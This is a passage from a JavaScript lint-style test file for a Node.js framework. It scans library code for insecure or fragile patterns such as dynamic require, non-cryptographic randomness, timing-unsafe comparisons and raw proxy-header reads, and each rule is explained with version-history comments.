  //     are intentionally locally-scoped helpers and skipped.
  //
  // Fix is rename, NOT allowlist. If one file has a genuine reason to
  // bind under a different name, every other file gets renamed to
  // match — never the other way.
  var files = _libFiles();
  var bindings = Object.create(null);   // module → { name → [{file,line}] }
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var src = fs.readFileSync(files[fi], "utf8");
    var lines = src.split("\n");
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      // Plain top-level binding: `var X = require("M");`
      var m = line.match(/^\s*var\s+(\w+)\s*=\s*require\(["']([^"']+)["']\)\s*;?\s*$/);
      // lazyRequire wrapper: `var X = lazyRequire(function () { return require("M"); });`
      // — same binding-identity, just deferred-load. Apply the same
      // canonical-name rule.
      if (!m) {
        m = line.match(/^\s*var\s+(\w+)\s*=\s*lazyRequire\(\s*function\s*\(\s*\)\s*\{\s*return\s+require\(["']([^"']+)["']\)\s*;?\s*\}\s*\)\s*;?\s*$/);
      }
      if (!m) continue;
      var name = m[1];
      var mod  = m[2];
      if (name.indexOf("_") === 0) continue;
      if (!bindings[mod]) bindings[mod] = Object.create(null);
      if (!bindings[mod][name]) bindings[mod][name] = [];
      bindings[mod][name].push({ file: rel, line: li + 1, content: line.trim() });
    }
  }
  var matches = [];
  var moduleKeys = Object.keys(bindings).sort();   // allow:bare-canonicalize-walk — stable report ordering, not canonicalize-for-hashing
  for (var mi = 0; mi < moduleKeys.length; mi++) {
    var mod2 = moduleKeys[mi];
    var nameMap = bindings[mod2];
    var nameKeys = Object.keys(nameMap);
    var canonical;
    if (Object.prototype.hasOwnProperty.call(CANONICAL_REQUIRE_BINDINGS, mod2)) {
      canonical = CANONICAL_REQUIRE_BINDINGS[mod2];
    } else if (nameKeys.length <= 1) {
      continue;   // single name across all files → consistent
    } else {
      // Majority-wins fallback. Ties resolve alphabetically.
      canonical = nameKeys[0];
      var topCount = nameMap[nameKeys[0]].length;
      for (var nk = 1; nk < nameKeys.length; nk++) {
        var c = nameMap[nameKeys[nk]].length;
        if (c > topCount || (c === topCount && nameKeys[nk] < canonical)) {
          canonical = nameKeys[nk]; topCount = c;
        }
      }
    }
    // Report every site whose binding name is NOT the canonical pick.
    for (var nk2 = 0; nk2 < nameKeys.length; nk2++) {
      var thisName = nameKeys[nk2];
      if (thisName === canonical) continue;
      var sites = nameMap[thisName];
      for (var si = 0; si < sites.length; si++) {
        matches.push({
          file:    sites[si].file,
          line:    sites[si].line,
          content: 'require("' + mod2 + '") bound as `' + thisName +
                   '` — rename to canonical `' + canonical + '`',
        });
      }
    }
  }
  matches = _filterMarkers(matches, "require-binding-name");
  _report("require() bindings: every `var X = require(\"M\")` for a " +
          "given module must use the canonical name (rename, don't " +
          "allowlist — update every site to match)",
    matches);
}

function testNoDynamicRequires() {
  // Every modern bundler (esbuild / webpack / ncc / rollup / Bun /
  // Deno) determines what to include in the bundle via STATIC
  // analysis: `require("./literal")` is traced; `require(variable)`
  // is not. Dynamic requires silently drop the target from SEA / pkg
  // / esbuild bundles, breaking packaging-mode invariance at runtime
  // ("module not loadable at <path>" at the first lookup).
  //
  // Caught by hermitstash-sync operator (2026-05-13) against v0.9.8
  // lib/vendor-data.js where `require(entry.module)` defeated the
  // SEA-bypass-removal that v0.9.8 was supposed to deliver.
  //
  // Match `require(` followed by anything that isn't a string-literal
  // opener (`"` or `'` or backtick — though backtick template strings
  // are also dynamic if they contain `${…}`, but pure backtick-no-
  // interpolation is rare in require()). Skip require.resolve too —
  // distinct API.
  var matches = _scan(/\brequire\(\s*[^"'`)]/);
  matches = _filterMarkers(matches, "dynamic-require");
  _report("require() argument must be a string literal " +
          "(or has dynamic-require allow marker)",
    matches);
}

// ---- Pattern 11: Math.random() in security-sensitive contexts ----

function testNoMathRandomForSecurity() {
  // Math.random() is NOT cryptographic. Framework crypto primitives
  // route through `b.crypto.generateBytes` / `nodeCrypto.randomBytes`.
  // Math.random has legitimate uses (jitter, non-security IDs); those
  // get an allow marker.
  var matches = _scan(/\bMath\.random\(/);
  matches = _filterMarkers(matches, "math-random-noncrypto");
  _report("Math.random() in lib/ has an explicit non-crypto allow marker",
    matches);
}

// ---- Pattern 12: raw `===` for likely hash/token/sig comparisons ----

function testNoRawHashCompare() {
  // Variable names ending in Hash / Token / Sig / Mac / Digest compared
  // with === are timing-attack-prone. Should use `crypto.timingSafeEqual`.
  var matches = _scan(
    /\b\w*(Hash|Token|Sig|Signature|Mac|Digest|Tag)\s*===\s*\w*(Hash|Token|Sig|Signature|Mac|Digest|Tag)/);
  matches = _filterMarkers(matches, "raw-hash-compare");
  _report("hash/token/sig/mac/digest compared with timingSafeEqual " +
          "(or has allow marker for known-non-secret comparison)",
    matches);
}

// ---- Pattern 13: new URL(...) without safeUrl.parse() guard ----

function testRawNewURL() {
  // Operator-supplied URLs should route through `safeUrl.parse` so the
  // protocol allowlist + length cap + userinfo block apply. Internal
  // URL building (test fixtures, sigv4 canonical query) is fine.
  var matches = _scan(/\bnew URL\(/);
  matches = _filterMarkers(matches, "raw-new-url");
  _report("new URL(...) routes through safeUrl.parse (or has allow marker)",
    matches);
}

// ---- Pattern 14: silent JSON.parse() on operator-supplied data ----

function testNoBareJsonParse() {
  // `JSON.parse(operatorInput)` lacks the maxBytes / depth / proto
  // pollution defenses that `safeJson.parse` adds. Internal JSON
  // (vendor manifest, tests, internal state) is fine with bare parse.
  var matches = _scan(/\bJSON\.parse\(/);
  // safe-json.js IS the safe wrapper; the bare JSON.parse call lives
  // there by definition (it's what safe-json wraps with maxBytes /
  // depth / proto-pollution defenses).
  matches = matches.filter(function (m) { return m.file !== "lib/safe-json.js"; });
  matches = _filterMarkers(matches, "bare-json-parse");
  _report("JSON.parse on operator input routes through safeJson.parse " +
          "(or has allow marker)",
    matches);
}

// ---- Pattern 15: Object.keys(...).sort() canonicalize walks ----

function testNoBareCanonicalizeWalks() {
  // Pattern from v0.6.60 / .66 / .67: walking with Object.keys(...).sort()
  // and JSON.stringify silently loses Date / Buffer / Map / Set / BigInt.
  // Should route through `lib/canonical-json`.
  var matches = _scan(/Object\.keys\(\w+\)\.sort\(\)/);
  matches = _filterMarkers(matches, "bare-canonicalize-walk");
  _report("Object.keys(...).sort() canonicalize walks route through " +
          "lib/canonical-json (or have allow marker)",
    matches);
}

// ---- Pattern 16: regex-only string format validators with no length cap ----

function testFormatValidatorLengthCap() {
  // Pattern from v0.6.61 (.email RFC 5321) / v0.6.62 (.url RFC 7230):
  // a regex-only validator like `EMAIL_RE.test(v)` accepts arbitrarily
  // long matching strings → DoS-shape. The validator should bound length
  // explicitly before the regex test. We can't perfectly grep this, but
  // we can flag any `\w+_RE.test(v)` line that doesn't have `\w+\.length`
  // in the surrounding 3 lines.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    // safe-buffer / safe-schema are the primitives that DEFINE the
    // shared format regexes. The .test() calls inside their helpers
    // (`isHex`, `hasCrlf`, schema format predicates) operate on
    // already-bounded inputs delivered by callers.
    if (rel === "lib/safe-buffer.js" || rel === "lib/safe-schema.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (!/\b[A-Z_]+_RE\.test\(/.test(line)) continue;
      // Look for a length bound in the surrounding 5 lines (any comparison:
      // <, >, =, !=, !==, including the explicit-length shape `s.length !==
      // expectedLength`). A byte-length bound (Buffer.byteLength /
      // safeBuffer.byteLengthOf) counts too — the byte-cap-vs-char-length
      // hardening replaces `.length` caps with byte-length on multibyte input,
      // and `byteLength(x) > MAX || RE.test(x)` short-circuits the regex on
      // anything over the cap just as `.length` does.
      var window = (lines[li-2] || "") + (lines[li-1] || "") +
                   line + (lines[li+1] || "") + (lines[li+2] || "");
      if (/\.length\s*[><=!]/.test(window) || /byteLength/.test(window)) continue;
      bad.push({
        file:    _relPath(files[fi]),
        line:    li + 1,
        content: line.trim(),
      });
    }
  }
  bad = _filterMarkers(bad, "regex-no-length-cap");
  _report("regex-only format validators bound length before test " +
          "(or have allow marker)",
    bad);
}

// ---- Pattern 17: process.exit() in lib/ (should not exit unilaterally) ----

function testNoProcessExitInLib() {
  var matches = _scan(/\bprocess\.exit\(/);
  matches = _filterMarkers(matches, "process-exit");
  _report("no process.exit() in lib/ (CLI surface only)", matches);
}

// ---- Pattern 17a: listen-port falsy-default footgun ----
//
// `var port = listenOpts.port || <default>` short-circuits on
// `port: 0` — the test path's ephemeral-bind request. macOS / Linux
// CI runners refuse non-privileged binds to default SMTP / submission
// / HTTP-server ports with EACCES, so the test fails even though it
// explicitly passed `port: 0`. Correct shape: explicit `undefined`
// check, `=== undefined ? <default> : listenOpts.port`. Cost us a
// CI cycle on v0.9.46 mail-server-mx + v0.9.47 mail-server-submission.
//
// Scope: listen-lifecycle identifiers only (`listenOpts.port`,
// `serverOpts.port`, `bindOpts.port`). Outbound connect contexts
// (`opts.port`, `u.port`, `endpoint.port`) treat port-0 as nonsense
// — `||` short-circuit there is fine.
function testListenPortFalsyDefault() {
  var matches = _scan(/\b(?:listen|server|bind)[A-Za-z]*Opts\.port\s*\|\|\s*\d+/);
  matches = _filterMarkers(matches, "listen-port-default");
  _report("listen() port-default uses explicit `=== undefined ? D : x` " +
          "(NOT `x.port || D` — short-circuits on test-path port: 0)",
    matches);
}

// ---- Pattern 17b: IMAP literalSize zero-rejection footgun ----
//
// RFC 9051 §6.3.12 allows zero-byte literals (e.g. APPEND of an empty
// message body). Filtering with `literalSize > 0` skips the legitimate
// edge case; the correct check is `>= 0` (or `!== null` with a
// downstream zero-byte short-circuit). Codex P1 PR #75 caught this on
// the IMAP listener.
function testImapLiteralSizeZeroFootgun() {
  var matches = _scan(/literalSize\s*>\s*0\b/);
  matches = _filterMarkers(matches, "literal-size-zero");
  _report("literalSize comparison: use `!== null` or `>= 0` (zero-byte " +
          "literals are RFC 9051 §6.3.12 legal — `literalSize > 0` skips " +
          "the empty-APPEND path)",
    matches);
}

// ---- Pattern 17c: CAPABILITY hardcoded SASL mechanism without authConfig gate ----
//
// IMAP / SMTP listeners that advertise AUTH=<mech> in their CAPABILITY
// reply must gate the mechanism off the operator's wired authConfig.
// Hardcoding `AUTH=PLAIN` in a caps array (without checking authConfig)
// sets clients up for AUTHENTICATE requests the listener then refuses.
// Codex P2 PR #75 caught this on the IMAP listener.
function testHardcodedAuthMechanismInCaps() {
  // Catch the specific shape "AUTH=PLAIN" / "AUTH=LOGIN" / similar in
  // a string-literal array assignment. Allow markers permit operator
  // overrides where the mechanism is genuinely always-on (e.g. test
  // fixtures with a hardcoded authConfig).
  var matches = _scan(/(?:caps|capabilities|advertised)\s*=\s*\[[^\]]*"AUTH=[A-Z][A-Z0-9-]*"/);
  matches = _filterMarkers(matches, "hardcoded-auth-mech");
  _report("CAPABILITY / EHLO advertisement: AUTH=<mech> entries gate off " +
          "operator's authConfig.mechanisms (don't hardcode in the caps " +
          "array)",
    matches);
}

// ---- Pattern 17d: buildProfile({ profile: ... }) wrong key ----
//
// `gateContract.makeProfileBuilder`-derived `buildProfile()` consumes
// `{ baseProfile, extends, overrides, removes }` — NOT `{ profile }`.
// Passing `profile:` silently produces `{}` and the eventual
// `validate(..., profile)` call falls back to the default strict
// profile, so operator-supplied `profile: "permissive"` is dropped on
// the floor. Codex P1 PR #77 caught this on `b.mail.send`'s
// guardDomain wiring (v0.9.52). The right call shape is either
// `buildProfile({ baseProfile: name })` or pass the profile name
// straight to `validate(input, { profile: name })`.
function testBuildProfileWrongKey() {
  var matches = _scan(/\.buildProfile\s*\(\s*\{\s*profile:/);
  matches = _filterMarkers(matches, "build-profile-base");
  _report(".buildProfile({ profile: ... }) — key should be " +
          "`baseProfile:` (or pass profile name directly to validate())",
    matches);
}

// ---- Pattern 18: catch (_e) {} swallowing without logging ----

function testNoSilentCatchSwallow() {
  // `catch (_e) { }` (empty body) silently swallows. Should at least
  // re-throw, log, or have an allow marker explaining why dropping
  // is correct (e.g., best-effort cleanup, audit-safe drops).
  var matches = _scan(/catch\s*\(\s*_\w*\s*\)\s*\{\s*\}/);
  matches = _filterMarkers(matches, "silent-catch");
  _report("empty catch(_e) {} blocks have an explicit silent-catch allow marker",
    matches);
}

// ---- Pattern 19: new RegExp(operatorString) — ReDoS via dynamic compilation ----

function testNoDynamicRegexFromOperatorInput() {
  // `new RegExp(opts.X)` lets an operator-supplied string compile to a
  // regex — ReDoS vector if the input is operator-controlled.
  var matches = _scan(/new RegExp\(/);
  // safe-json.js implements JSON Schema validation; the spec defines
  // `pattern` as a string, so compiling the operator-supplied schema
  // pattern is part of the documented surface (operator owns the
  // schema, not the runtime input).
  matches = matches.filter(function (m) { return m.file !== "lib/safe-json.js"; });
  matches = _filterMarkers(matches, "dynamic-regex");
  _report("new RegExp(...) marked with dynamic-regex allow marker " +
          "(input source documented)",
    matches);
}

// ---- Pattern 20: trustProxy bypass — raw req.headers x-forwarded-for read ----

function testNoRawXffRead() {
  // class: raw-xff
  // v0.5.6 (break-glass), v0.5.7 (error-page), v0.4.26 + v0.4.29
  // (middleware sweep): reading req.headers["x-forwarded-for"] (or
  // bracket-quoted) directly bypasses the trustProxy boundary. Should
  // route through requestHelpers.clientIp(req, { trustProxy }) so
  // X-Forwarded-For is honored only when the operator opted in.
  var matches = _scan(/req\.headers\s*\[\s*["']x-forwarded-for["']\s*\]/i);
  // request-helpers.js IS the canonical XFF reader; the read happens
  // there by definition.
  matches = matches.filter(function (m) { return m.file !== "lib/request-helpers.js"; });
  matches = _filterMarkers(matches, "raw-xff");
  _report("req.headers['x-forwarded-for'] routes through requestHelpers.clientIp",
    matches);
}

// ---- Pattern 20b: peer-gating bypass — raw X-Forwarded-Proto/-Host read ----

function testNoRawForwardedProtoHostRead() {
  // class: raw-xfp
  // The XFP sibling of Pattern 20. X-Forwarded-Proto / X-Forwarded-Host are
  // forgeable; reading them directly for a scheme/authority decision (Secure
  // cookie, HSTS, same-origin, the cryptographically-bound DPoP htu) bypasses
  // the peer-gating boundary — a direct caller can spoof the header. Route
  // through requestHelpers.trustedProtocol / trustedHost (or requestProtocol /
  // requestHost with a peer predicate) so the header is honored only when the
  // immediate peer is a declared trusted proxy. csrf-protect / security-headers
  // / cors / bot-guard / dpop all do; dpop was the consumer this rule was added
  // for (it read XFP/XFH via a bare trustForwardedHeaders boolean → htu
  // confusion). span-http-server reads both for the url.scheme/server.address
  // telemetry span attributes (display-only, not a trust sink) and carries an
  // allow:raw-xfp marker.
  var matches = _scan(/req\.headers\s*\[\s*["']x-forwarded-(?:proto|host)["']\s*\]/i);
  // request-helpers.js IS the canonical reader (the primitive home).
  matches = matches.filter(function (m) { return m.file !== "lib/request-helpers.js"; });
  matches = _filterMarkers(matches, "raw-xfp");
  _report("req.headers['x-forwarded-proto'|'x-forwarded-host'] routes through requestHelpers.trustedProtocol/trustedHost",
    matches);
}

// ---- Pattern 21: req.socket.remoteAddress raw read for actor IP ----

function testNoRawRemoteAddress() {
  // class: raw-remote-addr
  // v0.5.6: break-glass.grant was reading req.socket.remoteAddress
  // directly to populate audit-row IP, bypassing trustProxy. Audit /
  // observability emissions on the request path should resolve actor
  // IP through requestHelpers.clientIp / extractActorContext so the
  // operator's trustProxy posture is consistent.
  var matches = _scan(/\breq\.socket\.remoteAddress\b/);
  // request-helpers.js IS the canonical clientIp reader.
  matches = matches.filter(function (m) { return m.file !== "lib/request-helpers.js"; });
  matches = _filterMarkers(matches, "raw-remote-addr");
  _report("req.socket.remoteAddress routes through requestHelpers.clientIp",
    matches);
}

// ---- Pattern 22: process.env raw read in lib/ ----

function testNoRawProcessEnv() {
  // class: raw-process-env
  // v0.5.18: process.env.X reads should route through safeEnv.readVar
  // for the size cap + type coercion + missing/empty handling. log.js
  // is an exception (safeEnv requires log → load-time cycle); other
  // bootstrap files might be too. Mark per site.
  var matches = _scan(/\bprocess\.env\.\w+/);
  // safe-env.js / parsers/safe-env.js DEFINE the safe reader.
  matches = matches.filter(function (m) {
    return m.file !== "lib/safe-env.js" &&
           m.file !== "lib/parsers/safe-env.js";
  });
  matches = _filterMarkers(matches, "raw-process-env");
  _report("process.env reads route through safeEnv.readVar (or have allow marker)",
    matches);
}

// ---- Pattern 23: nodeCrypto.timingSafeEqual direct (length-throws) ----

function testNoRawTimingSafeEqual() {
  // class: raw-timing-safe-equal
  // v0.5.18: Node's nodeCrypto.timingSafeEqual throws on length-mismatch
  // (itself a side channel). Framework wrapper b.crypto.timingSafeEqual
  // short-circuits length-mismatch in constant time before delegating.
  // Only flag bindings named `nodeCrypto` (the explicit raw alias) —
  // files that bind `var crypto = require("./crypto")` (framework
  // wrapper) call `crypto.timingSafeEqual` legitimately.
  var matches = _scan(/\bnodeCrypto\.timingSafeEqual\(/);
  // The framework crypto module is the canonical wrapper.
  matches = matches.filter(function (m) { return m.file !== "lib/crypto.js"; });
  matches = _filterMarkers(matches, "raw-timing-safe-equal");
  _report("crypto.timingSafeEqual routes through b.crypto.timingSafeEqual " +
          "(length-tolerant wrapper)",
    matches);
}

// ---- Pattern 24: parseInt without explicit radix ----

function testParseIntRadix() {
  // class: parseint-no-radix
  // v0.6.2-class footgun: parseInt accepts leading-prefix matches and
  // hex/octal-coerces operator strings unexpectedly. All call sites
  // must specify radix.
  // Manual paren-balanced scan: find `parseInt(`, walk to matching
  // close, check for `,` at depth 0 in between.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var m = /\bparseInt\s*\(/.exec(line);
      if (!m) continue;
      var start = m.index + m[0].length;
      var depth = 1;
      var hasCommaAtDepth0 = false;
      var i;
      for (i = start; i < line.length && depth > 0; i++) {
        var ch = line.charAt(i);
        if (ch === "(") depth += 1;
        else if (ch === ")") depth -= 1;
        else if (ch === "," && depth === 1) hasCommaAtDepth0 = true;
      }
      // depth still >0 means call spans multiple lines; tolerant: skip.
      if (depth > 0) continue;
      if (!hasCommaAtDepth0) {
        bad.push({
          file:    _relPath(files[fi]),
          line:    li + 1,
          content: line.trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "parseint-no-radix");
  _report("parseInt(...) called with explicit radix", bad);
}

// ---- Pattern 25: Buffer.from(string) without encoding ----

function testBufferFromStringEncoding() {
  // class: buffer-from-no-encoding
  // Buffer.from("...") defaults to UTF-8, but the absence of an
  // explicit encoding masks intent — and for hex/base64 strings the
  // default UTF-8 is wrong silently. Require the encoding argument.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var m = /\bBuffer\.from\(\s*("[^"]*"|'[^']*')\s*\)/.exec(line);
      if (m) {
        bad.push({
          file:    _relPath(files[fi]),
          line:    li + 1,
          content: line.trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "buffer-from-no-encoding");
  _report("Buffer.from(string) calls pass an explicit encoding " +
          "(or have allow marker for ascii-safe literals)",
    bad);
}

// ---- Pattern 26: setInterval without unref for background timers ----

function testTimersUnref() {
  // class: timer-no-unref
  // Background timers (heartbeats, debounce flushers, rate-limit
  // sweepers, cache GC) without unref() pin the process — graceful
  // shutdown waits indefinitely. Framework should use safeAsync.sleep
  // (unref-aware) or wrap setInterval with .unref().
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (!/\bsetInterval\(/.test(line)) continue;
      // Widen window: the .unref() call may live a few lines below the
      // setInterval (e.g., wrapped with a typeof guard). 5-line window.
      var window = line + (lines[li+1] || "") + (lines[li+2] || "") +
                   (lines[li+3] || "") + (lines[li+4] || "");
      if (/\.unref\(\)/.test(window)) continue;
      bad.push({
        file:    _relPath(files[fi]),
        line:    li + 1,
        content: line.trim(),
      });
    }
  }
  bad = _filterMarkers(bad, "timer-no-unref");
  _report("setInterval timers call .unref() (or have allow marker for " +
          "process-pinning intent)",
    bad);
}

// ---- Pattern 27: nodeCrypto.randomBytes raw token generation ----

function testNoRawRandomBytesToken() {
  // class: raw-randombytes-token
  // v0.5.18 sweep: hand-rolled tokens via nodeCrypto.randomBytes(n)
  // .toString("hex"|"base64"|"base64url") should route through
  // b.crypto.generateToken / generateBytes so the framework's PQC-
  // posture primitives own the entropy source + format.
  var matches = _scan(/\b(nodeCrypto|crypto)\.randomBytes\([^)]+\)\s*\.\s*toString\s*\(/);
  // crypto.js itself wraps these.
  matches = matches.filter(function (m) { return m.file !== "lib/crypto.js"; });
  matches = _filterMarkers(matches, "raw-randombytes-token");
  _report("nodeCrypto.randomBytes(n).toString routes through " +
          "b.crypto.generateToken / generateBytes (or has allow marker)",
    matches);
}

// ---- Pattern 28: hand-rolled Promise+setTimeout instead of safeAsync.sleep ----

function testNoHandrolledSleep() {
  // class: handrolled-sleep
  // v0.4.28 router.js: `new Promise((resolve) => setTimeout(resolve, ms))`
  // should use safeAsync.sleep(ms, { unref: true }) so the framework's
  // outbound-timeout primitive owns timer lifecycle (unref, cancel,
  // shutdown integration).
  var matches = _scan(/new Promise\([^)]*\)\s*=>\s*setTimeout|new Promise\(function[^{]*\{\s*setTimeout/);
  matches = _filterMarkers(matches, "handrolled-sleep");
  _report("Promise+setTimeout routes through safeAsync.sleep",
    matches);
}

// ---- Pattern 29: raw http/https/fetch outbound bypassing httpClient ----

function testNoRawOutboundHttp() {
  // class: raw-outbound-http
  // SSRF guard + DNS pinning + retry policy live in b.httpClient.
  // Direct http.request / https.request / fetch in lib/ bypasses the
  // ssrfGuard + pinned-DNS lookup (v0.5.4 DNS-rebinding window).
  var matches = _scan(/\b(http|https)\.(request|get)\s*\(|^[^/]*\bfetch\s*\(/);
  // Documented exemptions:
  //   lib/http-client.js IS the wrapper.
  //   lib/network-dns.js DoH bootstrap can't loop through httpClient
  //     (httpClient → ssrfGuard → DNS → DoH → httpClient cycle).
  //   lib/testing.js IS the test request injector — bypasses the
  //     wrapper by design so tests can assert on raw request shapes.
  var exemptFiles = {
    "lib/http-client.js":  true,
    "lib/network-dns.js":  true,
    "lib/testing.js":      true,
  };
  matches = matches.filter(function (m) { return !exemptFiles[m.file]; });
  matches = _filterMarkers(matches, "raw-outbound-http");
  _report("http(s).request / fetch route through b.httpClient (or have allow marker)",
    matches);
}

// ---- Pattern 30: Number(process.env.X) coercion without isFinite ----

function testNoNumberEnvCoercion() {
  // class: number-env-coerce
  // v0.6.69 history: Number(process.env.MAX_X || "") coerces "" → 0,
  // "abc" → NaN, "Infinity" → Infinity. Operators reading numeric env
  // vars should route through b.config.coerce.number() / safeEnv
  // typed readers (NaN rejected, Infinity rejected).
  var matches = _scan(/\bNumber\s*\(\s*process\.env\b/);
  matches = _filterMarkers(matches, "number-env-coerce");
  _report("Number(process.env.X) routes through config.coerce.number / " +
          "safeEnv typed readers",
    matches);
}

// ============================================================
// Primitive-extraction-candidate detectors
// ------------------------------------------------------------
// These flag CODE DESIGN that looks like a one-off reinvention of
// something that should have been a shared primitive. Each rule's
// fundamental fix is "extract the pattern into lib/<name>.js (or
// extend an existing primitive) and refactor the call sites."
// ============================================================

// ---- Pattern 31: duplicate regex literal across files ----

function testNoDuplicateRegexAcrossFiles() {
  // class: duplicate-regex
  // v0.4.27 surfaced four files duplicating the email regex; the fix
  // was promoting it to safeSchema.EMAIL_RE. Same regex literal in 3+
  // files is an extraction candidate — the test catches future drift.
  var files = _libFiles();
  var seen = {};   // regexSource → [ {file, line} ]
  // Match `/.../<flags>` only when preceded by a regex-context token
  // (`=`, `(`, `,`, `?`, `:`, `[`, `;`, `!`, `&&`, `||`, `return`,
  // `throw`) — distinguishes regex literals from `*/` comment closers
  // and from `path/to/file` strings.
  var regexCtxRe = /(?:^|[=(,?:[;!&|]|\breturn\s|\bthrow\s|=>\s*)\s*\/((?:\\.|[^/\\\n])+)\/([gimsuy]*)(?=[\s,);.\]]|$)/g;
  for (var fi = 0; fi < files.length; fi++) {
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var m;
      regexCtxRe.lastIndex = 0;
      while ((m = regexCtxRe.exec(line)) !== null) {
        var src = m[1];
        // Skip trivial shapes — single chars, no meta, single literal.
        if (src.length < 6) continue;
        // Require at least one regex meta-character so plain string-
        // shaped matches don't trip (e.g., `/best effort/` from a
        // comment closer reaching the post-context).
        if (!/[\\^$*+?{}()|[\]]/.test(src)) continue;
        if (!seen[src]) seen[src] = [];
        seen[src].push({ file: _relPath(files[fi]), line: li + 1 });
      }
    }
  }
  var bad = [];
  Object.keys(seen).forEach(function (src) {
    var occurrences = seen[src];
    var distinctFiles = {};
    occurrences.forEach(function (o) { distinctFiles[o.file] = true; });
    if (Object.keys(distinctFiles).length >= 3) {
      bad.push({
        file:    occurrences[0].file,
        line:    occurrences[0].line,
        content: "regex /" + src.slice(0, 60) + (src.length > 60 ? "…" : "") +
                 "/ appears in " + Object.keys(distinctFiles).length +
                 " files: " + Object.keys(distinctFiles).slice(0, 4).join(", ") +
                 (Object.keys(distinctFiles).length > 4 ? ", …" : ""),
      });
    }
  });
  bad = _filterMarkers(bad, "duplicate-regex");
  _report("regex literal seen in 3+ files → extract to a shared constant",
    bad);
}

// ---- Pattern 32: hand-rolled deep clone ----

function testNoHandrolledDeepClone() {
  // class: handrolled-deep-clone
  // `JSON.parse(JSON.stringify(x))` is the deep-clone idiom that
  // silently drops Date / Buffer / Map / Set / BigInt / RegExp /
  // function / undefined. The framework's canonical-json walker is
  // the right primitive when the goal is canonicalization for hashing;
  // for genuine deep clone, structuredClone is the modern answer
  // (Node 17+) and should be wrapped in `b.safeBuffer.deepClone` or
  // similar. Either way, the inline shape is a primitive candidate.
  var matches = _scan(/\bJSON\.parse\s*\(\s*JSON\.stringify\s*\(/);
  matches = _filterMarkers(matches, "handrolled-deep-clone");
  _report("JSON.parse(JSON.stringify(x)) deep-clone → use canonical-json " +
          "or structuredClone",
    matches);
}

// ---- Pattern 33: hand-rolled buffer collection ----

function testNoHandrolledBufferCollect() {
  // class: handrolled-buffer-collect
  // The `var chunks = []; …on("data", chunks.push); …on("end",
  // Buffer.concat(chunks))` shape is what `b.safeBuffer.boundedChunkCollector`
  // exists for (with maxBytes cap + drop semantics). Inline reinvention
  // skips the cap and is the bug class v0.6.57 / .68 / .69 swept.
  // Files with `chunks.pop()` are editable-buffer patterns (e.g.,
  // backspace-aware stdin readers) — those don't fit the append-only
  // collector primitive and are exempt.
  // Files with streaming-peek patterns (`Buffer.concat(chunks)` followed
  // by partial-record inspection rather than complete-message resolve)
  // get a per-line allow marker since the primitive doesn't expose
  // peek; pqc-gate.js's TLS ClientHello parser is the canonical example.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/safe-buffer.js") continue;   // the primitive itself
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    if (!/Buffer\.concat\s*\(\s*\w*chunks?\b/.test(content)) continue;
    if (!/var\s+\w*chunks?\s*=\s*\[\s*\]/.test(content)) continue;
    // Skip editable-buffer patterns (push + pop in same file).
    if (/\bchunks?\s*\.\s*pop\s*\(/.test(content)) continue;
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      // Skip JSDoc / block-comment continuation lines — operator-facing
      // example code in @example blocks legitimately shows `Buffer.concat
      // (chunks)` as the consumer-side shape of stream consumption.
      if (/^\s*\*/.test(lines[li])) continue;
      if (/Buffer\.concat\s*\(\s*\w*chunks?\b/.test(lines[li])) {
        bad.push({
          file: rel,
          line: li + 1,
          content: lines[li].trim(),
        });
        break;   // one report per file
      }
    }
  }
  bad = _filterMarkers(bad, "handrolled-buffer-collect");
  _report("hand-rolled chunks-array buffer collect → use " +
          "safeBuffer.boundedChunkCollector (cap-bounded)",
    bad);
}

// ---- Pattern 34: hand-rolled debounce ----

function testNoHandrolledDebounce() {
  // class: handrolled-debounce
  // The `clearTimeout(t); t = setTimeout(fn, ms)` shape is the debounce
  // idiom. Used in 5+ places pre-sweep. Should be wrapped in a
  // `b.safeAsync.debounce(fn, ms)` primitive that handles the timer
  // lifecycle (.unref, cancel-on-shutdown).
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/safe-async.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length - 2; li++) {
      // clearTimeout(<x>) followed within 5 lines by <x> = setTimeout(...)
      var m = /\bclearTimeout(?:Fn)?\s*\(\s*(\w+)\s*\)/.exec(lines[li]);
      if (!m) continue;
      var name = m[1];
